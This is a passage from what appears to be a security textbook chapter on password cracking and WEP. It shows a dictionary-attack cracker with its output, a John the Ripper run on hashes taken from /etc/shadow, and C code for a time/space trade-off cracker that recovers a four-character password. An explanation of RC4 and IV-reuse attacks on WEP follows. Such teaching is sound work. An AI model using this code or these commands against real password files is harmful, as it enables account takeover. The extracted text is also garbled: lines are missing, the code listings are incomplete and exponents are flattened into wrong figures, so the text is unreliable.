/usr/share/dict/words.\nreader@hacking:~/booksrc $ gcc -o crypt_crack crypt_crack.c -lcrypt\nreader@hacking:~/booksrc $ ./crypt_crack /usr/share/dict/words jeHEAX1m66RV.\ntrying word:                                  ==>   jesS3DmkteZYk\ntrying word:   A                              ==>   jeV7uK/S.y/KU\ntrying word:   A's                            ==>   jeEcn7sF7jwWU\ntrying word:   AOL                            ==>   jeSFGex8ANJDE\ntrying word:   AOL's                          ==>   jesSDhacNYUbc\ntrying word:   Aachen                         ==>   jeyQc3uB14q1E\ntrying word:   Aachen's                       ==>   je7AQSxfhvsyM\ntrying word:   Aaliyah                        ==>   je/vAqRJyOZvU\ntrying word:   terse                          ==>   jelgEmNGLflJ2\ntrying word:   tersely                        ==>   jeYfo1aImUWqg\ntrying word:   terseness                      ==>   jedH11z6kkEaA\ntrying word:   terseness's                    ==>   jedH11z6kkEaA\ntrying word:   terser                         ==>   jeXptBe6psF3g\ntrying word:   tersest                        ==>   jenhzylhDIqBA\ntrying word:   tertiary                       ==>   jex6uKY9AJDto\ntrying word:   test                           ==>   jeHEAX1m66RV.\nThe hash \"jeHEAX1m66RV.\" is from the plaintext password \"test\".\nSince the word test was the original password and this word is found in\nthe words file, the password hash will eventually be cracked. This is why it\u2019s\nconsidered poor security practice to use passwords that are dictionary words\nThe downside to this attack is that if the original password isn\u2019t a word\nfound in the dictionary file, the password won\u2019t be found. For example, if a\nnon-dictionary word such as h4R% is used as a password, the dictionary attack\npassword \"h4R%\" with salt \"je\" hashes to ==> jeMqqfIfPNNTE\nreader@hacking:~/booksrc $ ./crypt_crack /usr/share/dict/words jeMqqfIfPNNTE\ntrying word:                                  ==>   jesS3DmkteZYk\ntrying word:   A                              ==>   jeV7uK/S.y/KU\ntrying word:   A's                            ==>   jeEcn7sF7jwWU\ntrying word:   AOL                            ==>   jeSFGex8ANJDE\ntrying word:   AOL's                          ==>   jesSDhacNYUbc\ntrying word:   Aachen                         ==>   jeyQc3uB14q1E\ntrying word:   Aachen's                       ==>   je7AQSxfhvsyM\ntrying word:   Aaliyah                        ==>   je/vAqRJyOZvU\ntrying word:   zooms                          ==>   je8A6DQ87wHHI\ntrying word:   zoos                           ==>   jePmCz9ZNPwKU\ntrying word:   zucchini                       ==>   jeqZ9LSWt.esI\ntrying word:   zucchini's                     ==>   jeqZ9LSWt.esI\ntrying word:   zucchinis                      ==>   jeqZ9LSWt.esI\ntrying word:   zwieback                       ==>   jezzR3b5zwlys\ntrying word:   zwieback's                     ==>   jezzR3b5zwlys\ntrying word:   zygote                         ==>   jei5HG7JrfLy6\ntrying word:   zygote's                       ==>   jej86M9AG0yj2\ntrying word:   zygotes                        ==>   jeWHQebUlxTmo\nCouldn't find the plaintext password in the supplied wordlist.\nCustom dictionary files are often made using different languages, standard\nmodifications of words (such as transforming letters to numbers), or simply\nappending numbers to the end of each word. While a bigger dictionary will\nyield more passwords, it will also take more time to process.\nA dictionary attack that tries every single possible combination is an exhaustive\nbrute-force attack. While this type of attack will technically be able to crack\nevery conceivable password, it will probably take longer than your grand-\nWith 95 possible input characters for crypt()-style passwords, there\nare 958 possible passwords for an exhaustive search of all eight-character\npasswords, which works out to be over seven quadrillion possible passwords.\nThis number gets so big so quickly because, as another character is added to\nthe password length, the number of possible passwords grows exponentially.\nAssuming 10,000 cracks per second, it would take about 22,875 years to try\nevery password. Distributing this effort across many machines and processors\nis one possible approach; however, it is important to remember that this will\nonly achieve a linear speedup. If one thousand machines were combined,\neach capable of 10,000 cracks per second, the effort would still take over 22\nyears. The linear speedup achieved by adding another machine is marginal\ncompared to the growth in keyspace when another character is added to the\nLuckily, the inverse of the exponential growth is also true; as characters\nare removed from the password length, the number of possible passwords\ndecreases exponentially. This means that a four-character password only has\n954 possible passwords. This keyspace has only about 84 million possible pass-\nwords, which can be exhaustively cracked (assuming 10,000 cracks per second)\nin a little over two hours. This means that, even though a password like h4R%\nisn\u2019t in any dictionary, it can be cracked in a reasonable amount of time.\nThis means that, in addition to avoiding dictionary words, password length\nis also important. Since the complexity scales up exponentially, doubling the\nlength to produce an eight-character password should bring the level of effort\nrequired to crack the password into the unreasonable time frame.\nSolar Designer has developed a password-cracking program called John\nthe Ripper that uses first a dictionary attack and then an exhaustive brute-\nforce attack. This program is probably the most popular one of its kind;\nit is available at http://www.openwall.com/john. It has been included on\nJohn the Ripper  Version 1.6  Copyright (c) 1996-98 by Solar Designer\n-wordfile:FILE -stdin     wordlist mode, read words from FILE or stdin\n-rules                    enable rules for wordlist mode\n-incremental[:MODE]       incremental mode [using section MODE]\n-external:MODE            external mode or word filter\n-stdout[:LENGTH]          no cracking, just write words to stdout\n-restore[:FILE]           restore an interrupted session [from FILE]\n-session:FILE             set session file name to FILE\n-status[:FILE]            print status of a session [from FILE]\n-makechars:FILE           make a charset, FILE will be overwritten\n-users:[-]LOGIN|UID[,..]  load this (these) user(s) only\n-groups:[-]GID[,..]       load users of this (these) group(s) only\n-shells:[-]SHELL[,..]     load users with this (these) shell(s) only\n-salts:[-]COUNT           load salts with at least COUNT passwords only\n-format:NAME              force ciphertext format NAME (DES/BSDI/MD5/BF/AFS/LM)\n-savemem:LEVEL            enable memory saving, at LEVEL 1..3\nreader@hacking:~/booksrc $ sudo tail -3 /etc/shadow\nmatrix:$1$zCcRXVsm$GdpHxqC9epMrdQcayUx0//:13763:0:99999:7:::\njose:$1$pRS4.I8m$Zy5of8AtD800SeMgm.2Yg.:13786:0:99999:7:::\nLoaded 2 passwords with 2 different salts (FreeBSD MD5 [32/32])\nguesses: 0  time: 0:00:00:01 0% (2)  c/s: 5522  trying: koko\nguesses: 0  time: 0:00:00:03 6% (2)  c/s: 5489  trying: exports\nguesses: 0  time: 0:00:00:05 10% (2)  c/s: 5561  trying: catcat\nguesses: 0  time: 0:00:00:09 20% (2)  c/s: 5514  trying: dilbert!\nguesses: 0  time: 0:00:00:10 22% (2)  c/s: 5513  trying: redrum3\nguesses: 1  time: 0:00:00:14 44% (2)  c/s: 5539  trying: KnightKnight\nguesses: 1  time: 0:00:00:17 59% (2)  c/s: 5572  trying: Gofish!\nIn this output, the account jose is shown to have the password of testing7.\nAnother interesting idea for password cracking is using a giant hash lookup\ntable. If all the hashes for all possible passwords were precomputed and stored\nin a searchable data structure somewhere, any password could be cracked\nin the time it takes to search. Assuming a binary search, this time would be\nabout O(log2 N), where N is the number of entries. Since N is 958 in the case\nof eight-character passwords, this works out to about O(8 log2 95), which is\nHowever, a hash lookup table like this would require about 100,000 tera-\nbytes of storage. In addition, the design of the password-hashing algorithm\ntakes this type of attack into consideration and mitigates it with the salt value.\nSince multiple plaintext passwords will hash to different password hashes with\ndifferent salts, a separate lookup table would have to be created for each salt.\nWith the DES-based crypt() function, there are 4,096 possible salt values, which\nmeans that even for a smaller keyspace, such as all possible four-character\npasswords, a hash lookup table becomes impractical. With a fixed salt, the\nstorage space needed for a single lookup table for all possible four-character\npasswords is about one gigabyte, but because of the salt values, there are 4,096\npossible hashes for a single plaintext password, necessitating 4,096 different\ntables. This raises the needed storage space up to about 4.6 terabytes, which\nThere is a trade-off between computational power and storage space that\nexists everywhere. This can be seen in the most elementary forms of computer\nscience and everyday life. MP3 files use compression to store a high-quality\nsound file in a relatively small amount of space, but the demand for compu-\ntational resources increases. Pocket calculators use this trade-off in the other\ndirection by maintaining a lookup table for functions such as sine and cosine\nto save the calculator from doing heavy computations.\nThis trade-off can also be applied to cryptography in what has become\nknown as a time/space trade-off attack. While Hellman\u2019s methods for this\ntype of attack are probably more efficient, the following source code should\nbe easier to understand. The general principle is always the same, though:\nTry to find the sweet spot between computational power and storage space,\nso that an exhaustive brute-force attack can be completed in a reasonable\namount of time, using a reasonable amount of space. Unfortunately, the\ndilemma of salts will still present itself, since this method still requires some\nform of storage. However, there are only 4,096 possible salts with crypt()-style\npassword hashes, so the effect of this problem can be diminished by reducing\nthe needed storage space far enough to remain reasonable despite the 4,096\nThis method uses a form of lossy compression. Instead of having an\nexact hash lookup table, several thousand possible plaintext values will be\nreturned when a password hash is entered. These values can be checked\nquickly to converge on the original plaintext password, and the lossy com-\npression allows for a major space reduction. In the demonstration code that\nfollows, the keyspace for all possible four-character passwords (with a fixed\nsalt) is used. The storage space needed is reduced by 88 percent, compared\nto a full hash lookup table (with a fixed salt), and the keyspace that must be\nbrute-forced through is reduced by about 1,018 times. Under the assumption\nof 10,000 cracks per second, this method can crack any four-character pass-\nword (with a fixed salt) in under eight seconds, which is a considerable\nspeedup when compared to the two hours needed for an exhaustive brute-\nThis method builds a three-dimensional binary matrix that correlates\nparts of the hash values with parts of the plaintext values. On the x-axis, the\nplaintext is split into two pairs: the first two characters and the second two\ncharacters. The possible values are enumerated into a binary vector that is\n952, or 9,025, bits long (about 1,129 bytes). On the y-axis, the ciphertext is\nsplit into four three-character chunks. These are enumerated the same way\ndown the columns, but only four bits of the third character are actually used.\nThis means there are 642 \u00b7 4, or 16,384, columns. The z-axis exists simply to\nmaintain eight different two-dimensional matrices, so four exist for each of\nThe basic idea is to split the plaintext into two paired values that are\nenumerated along a vector. Every possible plaintext is hashed into ciphertext,\nand the ciphertext is used to find the appropriate column of the matrix.\nThen the plaintext enumeration bit across the row of the matrix is turned\non. When the ciphertext values are reduced into smaller chunks, collisions\nIn this case, the column for HEA would have the bits corresponding to the\nplaintext pairs te, !J, \"., and \"8 turned on, as these plaintext/hash pairs are\nAfter the matrix is completely filled out, when a hash such as jeHEA38vqlkkQ\nis entered, the column for HEA will be looked up, and the two-dimensional\nmatrix will return the values te, !J, \"., and \"8 for the first two characters of\nthe plaintext. There are four matrices like this for the first two characters,\nusing ciphertext substring from characters 2 through 4, 4 through 6, 6 though\n8, and 8 though 10, each with a different vector of possible first two-character\nplaintext values. Each vector is pulled, and they are combined with a bitwise\nAND. This will leave only those bits turned on that correspond to the plaintext\npairs listed as possibilities for each substring of ciphertext. There are also\nfour matrices like this for the last two characters of plaintext.\nThe sizes of the matrices were determined by the pigeonhole principle.\nThis is a simple principle that states: If k + 1 objects are put into k boxes, at\nleast one of the boxes will contain two objects. So, to get the best results, the\ngoal is for each vector to be a little bit less than half full of 1s. Since 954, or\n81,450,625, entries will be put in the matrices, there need to be about twice\nas many holes to achieve 50 percent saturation. Since each vector has 9,025\nentries, there should be about (954 \u00b7 2) / 9025 columns. This works out to be\nabout 18,000 columns. Since ciphertext substrings of three characters are\nbeing used for the columns, the first two characters and four bits from the\nthird character are used to provide 642 \u00b7 4, or about 16 thousand columns\n(there are only 64 possible values for each character of ciphertext hash).\nThis should be close enough, because when a bit is added twice, the overlap\nis ignored. In practice, each vector turns out to be about 42 percent saturated\nSince there are four vectors that are pulled for a single ciphertext, the\nprobability of any one enumeration position having a 1 value in each vector\nis about 0.424, or about 3.11 percent. This means that, on average, the 9,025\npossibilities for the first two characters of plaintext are reduced by about 97\npercent to 280 possibilities. This is also done for the last two characters, pro-\nviding about 2802, or 78,400, possible plaintext values. Under the assumption\nof 10,000 cracks per second, this reduced keyspace would take under 8 seconds\nOf course, there are downsides. First, it takes at least as long to create the\nmatrix as the original brute-force attack would have taken; however, this is a\none-time cost. Also, the salts still tend to prohibit any type of storage attack,\nThe following two source code listings can be used to create a password\nprobability matrix and crack passwords with it. The first listing will generate a\nmatrix that can be used to crack all possible four-character passwords salted\nwith je. The second listing will use the generated matrix to actually do the\n/*********************************************************\\\n*  Password Probability Matrix   *    File: ppm_gen.c     *\n***********************************************************\n*                                                         *\n*  Author:        Jon Erickson <matrix@phiral.com>        *\n*  Organization:  Phiral Research Laboratories            *\n*                                                         *\n*  This is the generate program for the PPM proof of      *\n*  concept.  It generates a file called 4char.ppm, which  *\n*  character passwords salted with 'je'.  This file can   *\n*  be used to quickly crack passwords found within this   *\n*  keyspace with the corresponding ppm_crack.c program.   *\n*                                                         *\n\\*********************************************************/\n/* Map a single hash byte to an enumerated value. */\nreturn (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));\n/* Generate a 4\u2013char.ppm file with all possible 4-char passwords (salted w/ je). */\nbarf(\"Error: Couldn't open file '4char.ppm' for writing.\\n\", NULL);\ncode = crypt((const char *)plain, (const char *)\"je\"); // Hash it.\n/* Lossfully store statistical info about the pairings. */\nval = enum_hashtriplet(code[2], code[3], code[4]); // Store info about bytes 2-4.\ncharval = (i-32)*95 + (j-32); // First 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\nval = HEIGHT + enum_hashtriplet(code[4], code[5], code[6]); // bytes 4-6\ncharval = (i-32)*95 + (j-32); // First 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\nval = (2 * HEIGHT) + enum_hashtriplet(code[6], code[7], code[8]); // bytes 6-8\ncharval = (i-32)*95 + (j-32); // First 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\nval = (3 * HEIGHT) + enum_hashtriplet(code[8], code[9], code[10]); // bytes 8-10\ncharval = (i-32)*95 + (j-32); // First 2 plaintext chars\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\nThe first piece of code, ppm_gen.c, can be used to generate a four-\ncharacter password probability matrix, as shown in the output below. The\n-O3 option passed to GCC tells it to optimize the code for speed when it\nreader@hacking:~/booksrc $ gcc -O3 -o ppm_gen ppm_gen.c -lcrypt\nThe 142MB 4char.ppm file contains loose associations between the\nplaintext and hash data for every possible four-character password. This data\ncan then be used by this next program to quickly crack four-character pass-\n/*********************************************************\\\n*  Password Probability Matrix   *    File: ppm_crack.c   *\n***********************************************************\n*                                                         *\n*  Author:        Jon Erickson <matrix@phiral.com>        *\n*  Organization:  Phiral Research Laboratories            *\n*                                                         *\n*  This is the crack program for the PPM proof of concept.*\n*  It uses an existing file called 4char.ppm, which       *\n*  character passwords salted with 'je'.  This file can   *\n*  be generated with the corresponding ppm_gen.c program. *\n*                                                         *\n\\*********************************************************/\n/* Map a single hash byte to an enumerated value. */\nreturn (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));\n/* Returns the bit in the vector at the passed index position */\nreturn ((vector[(index/8)]&(1<<(index%8)))>>(index%8));\n/* Counts the number of plaintext pairs in the passed vector */\n/* Print the plaintext pairs that each ON bit in the vector enumerates. */\nif(get_vector_bit(vector, i) == 1) { // If bit is on,\n/* Crack a 4-character password using generated 4char.ppm file. */\nunsigned char bin_vector1[WIDTH], bin_vector2[WIDTH], temp_vector[WIDTH];\nbarf(\"Usage: %s <password hash>  (will use the file 4char.ppm)\\n\", argv[0]);\nbarf(\"Fatal: Couldn't open PPM file for reading.\\n\", NULL);\nprintf(\"Filtering possible plaintext bytes for the first two characters:\\n\");\nfseek(fd,(DCM*0)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);\nfread(bin_vector1, WIDTH, 1, fd); // Read the vector associating bytes 2-4 of hash.\nprintf(\"only 1 vector of 4:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, len*100.0/\nfseek(fd,(DCM*1)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 4-6 of hash.\nmerge(bin_vector1, temp_vector);  // Merge it with the first vector.\nprintf(\"vectors 1 AND 2 merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nfseek(fd,(DCM*2)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 6-8 of hash.\nmerge(bin_vector1, temp_vector);  // Merge it with the first two vectors.\nprintf(\"first 3 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nfseek(fd,(DCM*3)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associatind bytes 8-10 of hash.\nmerge(bin_vector1, temp_vector);  // Merge it with the othes vectors.\nprintf(\"all 4 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nprintf(\"Possible plaintext pairs for the first two bytes:\\n\");\nprintf(\"\\nFiltering possible plaintext bytes for the last two characters:\\n\");\nfseek(fd,(DCM*4)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);\nfread(bin_vector2, WIDTH, 1, fd); // Read the vector associating bytes 2-4 of hash.\nprintf(\"only 1 vector of 4:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len, len*100.0/\nfseek(fd,(DCM*5)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 4-6 of hash.\nmerge(bin_vector2, temp_vector);  // Merge it with the first vector.\nprintf(\"vectors 1 AND 2 merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nfseek(fd,(DCM*6)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associating bytes 6-8 of hash.\nmerge(bin_vector2, temp_vector);  // Merge it with the first two vectors.\nprintf(\"first 3 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nfseek(fd,(DCM*7)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);\nfread(temp_vector, WIDTH, 1, fd); // Read the vector associatind bytes 8-10 of hash.\nmerge(bin_vector2, temp_vector);  // Merge it with the othes vectors.\nprintf(\"all 4 vectors merged:\\t%d plaintext pairs, with %0.2f%% saturation\\n\", len,\nprintf(\"Possible plaintext pairs for the last two bytes:\\n\");\nfor(i=0; i < 9025; i++) { // Find possible first two plaintext bytes.\nprob_vector1[1][pv1_len] = i - (prob_vector1[0][pv1_len] * 95);\nfor(i=0; i < 9025; i++) { // Find possible last two plaintext bytes.\nprob_vector2[1][pv2_len] = i - (prob_vector2[0][pv2_len] * 95);\nprintf(\"Cracking remaining %d possibilites..\\n\", pv1_len*pv2_len);\nprintf(\"Password wasn't salted with 'je' or is not 4 chars long.\\n\");\nThe second piece of code, ppm_crack.c, can be used to crack the\ntroublesome password of h4R% in a matter of seconds:\npassword \"h4R%\" with salt \"je\" hashes to ==> jeMqqfIfPNNTE\nreader@hacking:~/booksrc $ gcc -O3 -o ppm_crack ppm_crack.c -lcrypt\nreader@hacking:~/booksrc $ ./ppm_crack jeMqqfIfPNNTE\nFiltering possible plaintext bytes for the first two characters:\nonly 1 vector of 4:     3801 plaintext pairs, with 42.12% saturation\nvectors 1 AND 2 merged: 1666 plaintext pairs, with 18.46% saturation\nfirst 3 vectors merged: 695 plaintext pairs, with 7.70% saturation\nall 4 vectors merged:   287 plaintext pairs, with 3.18% saturation\n4  9  N !& !M !Q \"/ \"5 \"W #K #d #g #p $K $O $s %) %Z %\\ %r &( &T '- '0 '7 'D\n'F (  (v (| )+ ). )E )W *c *p *q *t *x +C -5 -A -[ -a .% .D .S .f /t 02 07 0?\n0e 0{ 0| 1A 1U 1V 1Z 1d 2V 2e 2q 3P 3a 3k 3m 4E 4M 4P 4X 4f 6  6, 6C 7: 7@ 7S\n7z 8F 8H 9R 9U 9_ 9~ :- :q :s ;G ;J ;Z ;k <! <8 =! =3 =H =L =N =Y >V >X ?1 @#\n@W @v @| AO B/ B0 BO Bz C( D8 D> E8 EZ F@ G& G? Gj Gy H4 I@ J  JN JT JU Jh Jq\nKs Ku M) M{ N, N: NC NF NQ Ny O/ O[ P9 Pc Q! QA Qi Qv RA Sg Sv T0 Te U& U> UO\nVT V[ V] Vc Vg Vi W: WG X\" X6 XZ X` Xp YT YV Y^ Yl Yy Y{ Za [$ [* [9 [m [z \\\" \\\n+ \\C \\O \\w ]( ]: ]@ ]w _K _j `q a. aN a^ ae au b: bG bP cE cP dU d] e! fI fv g!\ngG h+ h4 hc iI iT iV iZ in k. kp l5 l` lm lq m, m= mE n0 nD nQ n~ o# o: o^ p0\np1 pC pc q* q0 qQ q{ rA rY s\" sD sz tK tw u- v$ v. v3 v; v_ vi vo wP wt x\" x&\nx+ x1 xQ xX xi yN yo zO zP zU z[ z^ zf zi zr zt {- {B {a |s }) }+ }? }y ~L ~m\nFiltering possible plaintext bytes for the last two characters:\nonly 1 vector of 4:     3821 plaintext pairs, with 42.34% saturation\nvectors 1 AND 2 merged: 1677 plaintext pairs, with 18.58% saturation\nfirst 3 vectors merged: 713 plaintext pairs, with 7.90% saturation\nall 4 vectors merged:   297 plaintext pairs, with 3.29% saturation\n!  & != !H !I !K !P !X !o !~ \"r \"{ \"} #% #0 $5 $] %K %M %T &\" &% &( &0 &4 &I\n&q &} 'B 'Q 'd )j )w *I *] *e *j *k *o *w *| +B +W ,' ,J ,V -z .  .$ .T /' /_\n0Y 0i 0s 1! 1= 1l 1v 2- 2/ 2g 2k 3n 4K 4Y 4\\ 4y 5- 5M 5O 5} 6+ 62 6E 6j 7* 74\n8E 9Q 9\\ 9a 9b :8 :; :A :H :S :w ;\" ;& ;L <L <m <r <u =, =4 =v >v >x ?& ?` ?j\n?w @0 A* B  B@ BT C8 CF CJ CN C} D+ D? DK Dc EM EQ FZ GO GR H) Hj I: I> J( J+\nJ3 J6 Jm K# K) K@ L, L1 LT N* NW N` O= O[ Ot P: P\\ Ps Q- Qa R% RJ RS S3 Sa T!\nT$ T@ TR T_ Th U\" U1 V* V{ W3 Wy Wz X% X* Y* Y? Yw Z7 Za Zh Zi Zm [F \\( \\3 \\5 \\\n_ \\a \\b \\| ]$ ]. ]2 ]? ]d ^[ ^~ `1 `F `f `y a8 a= aI aK az b, b- bS bz c( cg dB\ne, eF eJ eK eu fT fW fo g( g> gW g\\ h$ h9 h: h@ hk i? jN ji jn k= kj l7 lo m<\nm= mT me m| m} n% n? n~ o  oF oG oM p\" p9 p\\ q} r6 r= rB sA sN s{ s~ tX tp u\nu2 uQ uU uk v# vG vV vW vl w* w> wD wv x2 xA y: y= y? yM yU yX zK zv {# {) {=\nThese programs are proof-of-concept hacks, which take advantage of the\nbit diffusion provided by hash functions. There are other time-space trade-off\nattacks, and some have become quite popular. RainbowCrack is a popular\ntool, which has support for multiple algorithms. If you want to learn more,\nWireless 802.11b security has been a big issue, primarily due to the absence\nof it. Weaknesses in Wired Equivalent Privacy (WEP), the encryption method\nused for wireless, contribute greatly to the overall insecurity. There are other\ndetails, sometimes ignored during wireless deployments, which can also lead\nThe fact that wireless networks exist on layer 2 is one of these details.\nIf the wireless network isn\u2019t VLANed off or firewalled, an attacker associated\nto the wireless access point could redirect all the wired network traffic out\nover the wireless via ARP redirection. This, coupled with the tendency to\nhook wireless access points to internal private networks, can lead to some\nOf course, if WEP is turned on, only clients with the proper WEP key\nwill be allowed to associate to the access point. If WEP is secure, there\nshouldn\u2019t be any concern about rogue attackers associating and causing\nhavoc. This begs the question, \u201cHow secure is WEP?\u201d\nWEP was meant to be an encryption method providing security equivalent\nto a wired access point. It was originally designed with 40-bit keys; later,\nWEP2 came along to increase the key size to 104 bits. All of the encryption is\ndone on a per-packet basis, so each packet is essentially a separate plaintext\nFirst, a checksum of message M is computed, so the message integrity\ncan be checked later. This is done using a 32-bit cyclic redundancy check-\nsum function aptly named CRC32. This checksum will be called CS, so\nCS = CRC32(M). This value is appended to the end of the message, which\nNow, the plaintext message needs to be encrypted. This is done using\nRC4, which is a stream cipher. This cipher, initialized with a seed value,\ncan generate a keystream, which is just an arbitrarily long stream of pseudo-\nrandom bytes. WEP uses an initialization vector (IV) for the seed value.\nThe IV consists of 24 bits generated for each packet. Some older WEP\nimplementations simply use sequential values for the IV, while others use\nRegardless of how the 24 bits of IV are chosen, they are prepended to\nthe WEP key. (These 24 bits of IV are included in the WEP key size in a bit\nof clever marketing spin; when a vendor talks about 64-bit or 128-bit WEP\nkeys, the actual keys are only 40 bits and 104 bits, respectively, combined\nwith 24 bits of IV.) The IV and the WEP key together make up the seed\nThen the seed value S is fed into RC4, which will generate a keystream.\nThis keystream is XORed with the plaintext message P to produce the\nciphertext C. The IV is prepended to the ciphertext, and the whole thing is\nencapsulated with yet another header and sent out over the radio link.\nWhen the recipient receives a WEP-encrypted packet, the process is simply\nreversed. The recipient pulls the IV from the message and then concatenates\nthe IV with his own WEP key to produce a seed value of S. If the sender and\nreceiver both have the same WEP key, the seed values will be the same. This\nseed is fed into RC4 again to produce the same keystream, which is XORed\nwith the rest of the encrypted message. This will produce the original plaintext\nmessage, consisting of the packet message M concatenated with the integrity\nchecksum CS. The recipient then uses the same CRC32 function to recalculate\nthe checksum for M and checks that the calculated value matches the received\nvalue of CS. If the checksums match, the packet is passed on. Otherwise, there\nwere too many transmission errors or the WEP keys didn\u2019t match, and the\nRC4 is a surprisingly simple algorithm. It consists of two algorithms: the Key\nScheduling Algorithm (KSA) and the Pseudo-Random Generation Algorithm\n(PRGA). Both of these algorithms use an 8-by-8 S-box, which is just an array of\n256 numbers that are both unique and range in value from 0 to 255. Stated\nsimply, all the numbers from 0 to 255 exist in the array, but they\u2019re all just\nmixed up in different ways. The KSA does the initial scrambling of the S-box,\nbased on the seed value fed into it, and the seed can be up to 256 bits long.\nFirst, the S-box array is filled with sequential values from 0 to 255. This\narray will be aptly named S. Then, another 256-byte array is filled with the seed\nvalue, repeating as necessary until the entire array is filled. This array will be\nnamed K. Then the S array is scrambled using the following pseudo-code.\nOnce that is done, the S-box is all mixed up based on the seed value.\nThat\u2019s the key scheduling algorithm. Pretty simple.\nNow when keystream data is needed, the Pseudo-Random Generation\nAlgorithm (PRGA) is used. This algorithm has two counters, i and j, which\nare both initialized at 0 to begin with. After that, for each byte of keystream\nThe outputted byte of S[t] is the first byte of the keystream. This algorithm\nRC4 is simple enough that it can be easily memorized and implemented\non the fly, and it is quite secure if used properly. However, there are a few\nThere are several problems with the security of WEP. In all fairness, it was\nnever meant to be a strong cryptographic protocol, but rather a way to provide\na wired equivalency, as alluded to by the acronym. Aside from the security\nweaknesses relating to association and identities, there are several problems\nwith the cryptographic protocol itself. Some of these problems stem from\nthe use of CRC32 as a checksum function for message integrity, and other\nBrute forcing will always be a possible attack on any computationally secure\ncryptosystem. The only question that remains is whether it\u2019s a practical attack\nor not. With WEP, the actual method of offline brute forcing is simple:\nCapture a few packets, then try to decrypt the packets using every possible\nkey. Next, recalculate the checksum for the packet, and compare this with\nthe original checksum. If they match, then that\u2019s most likely the key. Usually,\nthis needs to be done with at least two packets, since it\u2019s likely that a single\npacket can be decrypted with an invalid key yet the checksum will still be\nHowever, under the assumption of 10,000 cracks per second, brute forcing\nthrough the 40-bit keyspace would take over three years. Realistically, modern\nprocessors can achieve more than 10,000 cracks per second, but even at\n200,000 cracks per second, this would take a few months. Depending on\nthe resources and dedication of an attacker, this type of attack may or may\nTim Newsham has provided an effective cracking method that attacks\nweaknesses in the password-based key-generation algorithm that is used\nby most 40-bit (marketed as 64-bit) cards and access points. His method\neffectively reduces the 40-bit keyspace down to 21 bits, which can be cracked\nin a matter of minutes under the assumption of 10,000 cracks per second\n(and in a matter of seconds on a modern processor). More information on\nhis methods can be found at http://www.lava.net/~newsham/wlan.\nFor 104-bit (marketed as 128-bit) WEP networks, brute-forcing just isn\u2019t\nAnother potential problem with WEP lies in keystream reuse. If two\nplaintexts (P) are XORed with the same keystream to produce two separate\nciphertexts (C), XORing those ciphertexts together will cancel out the\nkeystream, resulting in the two plaintexts XORed with each other.\nC1 \u2295 C2 = [P1 \u2295 RC4(seed)] \u2295 [P2 \u2295 RC4(seed)] = P1 \u2295 P2\nFrom here, if one of the plaintexts is known, the other one can easily be\nrecovered. In addition, since the plaintexts in this case are Internet packets\nwith a known and fairly predictable structure, various techniques can be\nThe IV is intended to prevent these types of attacks; without it, every\npacket would be encrypted with the same keystream. If a different IV is used\nfor each packet, the keystreams for packets will also be different. However, if\nthe same IV is reused, both packets will be encrypted with the same keystream.\nThis is a condition that is easy to detect, since the IVs are included in plaintext\nin the encrypted packets. Moreover, the IVs used for WEP are only 24 bits in\nlength, which nearly guarantees that IVs will be reused. Assuming that IVs\nare chosen at random, statistically there should be a case of keystream reuse\nThis number seems surprisingly small due to a counterintuitive prob-\nabilistic phenomenon known as the birthday paradox. This paradox states that\nif 23 people are in the same room, two of these people should share a birthday.\nWith 23 people, there are (23 \u00b7 22) / 2, or 253, possible pairs. Each pair has a\nprobability of success of 1/365, or about 0.27 percent, which corresponds to\na probability of failure of 1 \u2212 (1 / 365), or about 99.726 percent. By raising\nthis probability to the power of 253, the overall probability of failure is shown\nto be about 49.95 percent, meaning that the probability of success is just a\nThis works the same way with IV collisions. With 5,000 packets, there are\n(5000 \u00b7 4999) / 2, or 12,497,500, possible pairs. Each pair has a probability of\nfailure of 1 \u2212 (1 / 224). When this is raised to the power of the number of\npossible pairs, the overall probability of failure is about 47.5 percent, meaning\nthat there\u2019s a 52.5 percent chance of an IV collision with 5,000 packets:\nAfter an IV collision is discovered, some educated guesses about the\nstructure of the plaintexts can be used to reveal the original plaintexts by\nXORing the two ciphertexts together. Also, if one of the plaintexts is known,\nthe other plaintext can be recovered with a simple XORing. One method\nof obtaining known plaintexts might be through spam email, where the\nattacker sends the 